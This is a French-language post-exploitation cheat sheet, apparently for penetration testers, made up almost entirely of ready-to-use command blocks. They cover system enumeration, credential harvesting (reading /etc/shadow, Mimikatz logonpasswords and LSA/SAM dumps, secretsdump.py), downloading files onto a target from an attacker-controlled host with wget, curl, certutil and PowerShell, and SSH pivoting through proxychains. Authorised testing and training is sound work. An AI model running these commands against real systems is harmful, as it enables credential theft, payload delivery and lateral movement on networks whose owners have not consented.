# Post-Exploitation

## Apres avoir obtenu un acces

1. **Stabiliser le shell** (upgrade TTY)
2. **Enumeration locale** (qui suis-je, ou suis-je)
3. **Persistence** (si autorise dans le scope)
4. **Recolte de credentials**
5. **Mouvement lateral**
6. **Exfiltration de donnees**

## Enumeration post-exploitation

### Linux

```bash
whoami && id
uname -a
cat /etc/os-release
sudo -l                          # Ce que je peux executer en sudo
find / -perm -4000 2>/dev/null   # Binaires SUID
cat /etc/crontab                 # Taches planifiees
ls -la /home/                    # Utilisateurs
env                              # Variables d'environnement
netstat -tulnp                   # Connexions reseau
ps aux                           # Processus en cours
```

### Windows

```powershell
whoami /all
systeminfo
net user
net localgroup administrators
cmdkey /list                     # Credentials sauvegardees
schtasks /query /fo LIST /v      # Taches planifiees
netstat -ano                     # Connexions
tasklist /svc                    # Processus et services
```

## Recolte de credentials

### Linux

```bash
cat /etc/shadow
# Chercher des mots de passe dans les fichiers
grep -ri "password" /home/ /var/ /opt/ 2>/dev/null
find / -name "*.bak" -o -name "*.old" -o -name "*.conf" 2>/dev/null
```

### Windows

```powershell
# Mimikatz
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords         # Mots de passe en memoire
sekurlsa::tickets                # Tickets Kerberos
lsadump::sam                     # Dump SAM
lsadump::lsa /patch              # Dump LSA

# Secretsdump (depuis Kali)
secretsdump.py domaine/user:password@IP
```

## Transfert de fichiers

```bash
# Python HTTP server (sur attaquant)
python3 -m http.server 80

# Sur la cible Linux
wget http://IP_ATTAQUANT/fichier
curl http://IP_ATTAQUANT/fichier -o fichier

# Sur la cible Windows
certutil -urlcache -f http://IP_ATTAQUANT/fichier fichier.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://IP/f','C:\Temp\f')"
```

## Pivoting basique

```bash
# SSH tunnel local
ssh -L 8080:IP_INTERNE:80 user@IP_PIVOT

# SSH tunnel dynamique (SOCKS proxy)
ssh -D 9050 user@IP_PIVOT
# Puis utiliser proxychains
proxychains nmap -sT IP_INTERNE
```
